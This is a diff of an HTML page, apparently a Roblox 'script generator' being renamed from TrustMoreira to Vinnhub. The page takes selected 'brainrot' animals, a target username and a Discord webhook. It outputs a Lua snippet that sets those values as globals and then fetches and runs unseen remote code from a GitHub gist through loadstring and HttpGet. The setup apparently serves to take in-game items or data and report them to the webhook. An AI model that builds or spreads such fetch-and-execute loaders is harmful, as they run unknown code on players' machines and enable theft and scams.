@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vinhub</title>
+<title>Vinnhub</title>
 <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -153,7 +153,6 @@
     margin-bottom: .45rem;
   }
 
-  /* ── BOX 1 — brainrot selector ── */
   .search-row {
     display: flex;
     gap: .6rem;
@@ -201,7 +200,6 @@
 
   .btn-sm.red:hover { background: rgba(244,63,94,.12); }
 
-  /* scrollable list */
   .animal-list {
     background: var(--bg);
     border: 1px solid var(--border);
@@ -254,7 +252,6 @@
 
   .sel-count span { color: var(--accent); }
 
-  /* ── Text inputs ── */
   .txt {
     width: 100%;
     background: var(--bg);
@@ -276,7 +273,6 @@
   .txt::placeholder { color: #1e2636; }
   .hint { font-family: 'Share Tech Mono', monospace; font-size: .67rem; color: #252f40; margin-top: .4rem; }
 
-  /* ── Generate ── */
   .btn-gen {
     display: block;
     width: 100%;
@@ -299,7 +295,6 @@
   .btn-gen:hover { box-shadow: 0 0 40px rgba(0,229,255,.35); transform: translateY(-1px); }
   .btn-gen:active { transform: none; }
 
-  /* ── Output ── */
   .out-ph { display: flex; align-items: center; gap: .6rem; padding: .75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
 
   .btn-copy {
@@ -340,14 +335,6 @@
 
   .code-block.empty { color: #1e2a38; font-style: italic; white-space: pre-wrap; }
 
-  /* syntax colours */
-  .ck  { color: #546e7a; }
-  .kw  { color: #c792ea; }
-  .fn  { color: #82aaff; }
-  .str { color: #c3e88d; }
-  .var { color: #f07178; }
-
-  /* ── Animations ── */
   @keyframes fadeDown { from { opacity:0; transform: translateY(-16px); } to { opacity:1; transform: none; } }
   @keyframes fadeUp   { from { opacity:0; transform: translateY(16px);  } to { opacity:1; transform: none; } }
   @keyframes blink    { 0%,100% { opacity:1; } 50% { opacity:.3; } }
@@ -357,11 +344,10 @@
 <div class="wrap">
 
   <header>
-    <div class="logo-row"><h1>TrustMoreira</h1></div>
+    <div class="logo-row"><h1>Vinnhub</h1></div>
     <p class="tagline">Roblox • Brainrot Animals • Script Generator</p>
   </header>
 
-  <!-- BOX 1 – Animal selector -->
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
     <div class="pb">
@@ -377,7 +363,6 @@
     </div>
   </div>
 
-  <!-- BOX 2 – Username -->
   <div class="panel">
     <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
     <div class="pb">
@@ -387,20 +372,17 @@
     </div>
   </div>
 
-  <!-- BOX 3 – Webhook -->
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
     <div class="pb">
       <label class="lbl">Webhook URL</label>
       <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
-      <p class="hint">Paste your Discord webhook — it gets placed directly into the script.</p>
+      <p class="hint">Paste your Discord webhook.</p>
     </div>
   </div>
 
-  <!-- Generate -->
   <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
 
-  <!-- Output -->
   <div class="panel">
     <div class="out-ph">
       <div class="dot dot-green"></div>
@@ -450,27 +432,15 @@ function filterList() { renderList(document.getElementById('searchBox').value); 
 function selectAll()  { ANIMALS.forEach(n => selected.add(n)); renderList(document.getElementById('searchBox').value); }
 function clearAll()   { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
-function flashErr(id) {
-  const el = document.getElementById(id);
-  el.style.borderColor = 'var(--danger)';
-  el.style.boxShadow   = '0 0 0 3px rgba(244,63,94,.12)';
-  setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1500);
-}
-
 function generate() {
   const username = document.getElementById('usernameInput').value.trim();
   const webhook  = document.getElementById('webhookInput').value.trim();
   const out      = document.getElementById('outputBlock');
 
-  if (selected.size === 0) { flashErr('animalList');    return; }
-  if (!username)           { flashErr('usernameInput'); return; }
-  if (!webhook)            { flashErr('webhookInput');  return; }
+  if (selected.size === 0 || !username || !webhook) return;
 
   const names = [...selected];
-  const pad   = '    ';
-
-  // Build WANTED_BRAINROTS lines
-  const brainrotLines = names.map(n => `${pad}"${n}",`).join('\n');
+  const brainrotLines = names.map(n => `    ["${n}"] = true,`).join('\n');
 
   const script =
 `getgenv().WEBHOOK_URL = "${webhook}"
@@ -478,7 +448,6 @@ getgenv().TARGET_USERNAME = "${username}"
 getgenv().WANTED_BRAINROTS = {
 ${brainrotLines}
 }
-getgenv().SCRIPT_KEY = "KEYLESS"
 loadstring(game:HttpGet("https://gist.githubusercontent.com/HopeThisWorkPpp/c2788cdfd3c62296b8721e721f66b396/raw/973acbe9093269a953503bee64d5aabf70c901e7/main.lua"))()`;
 
   out.className   = 'code-block';
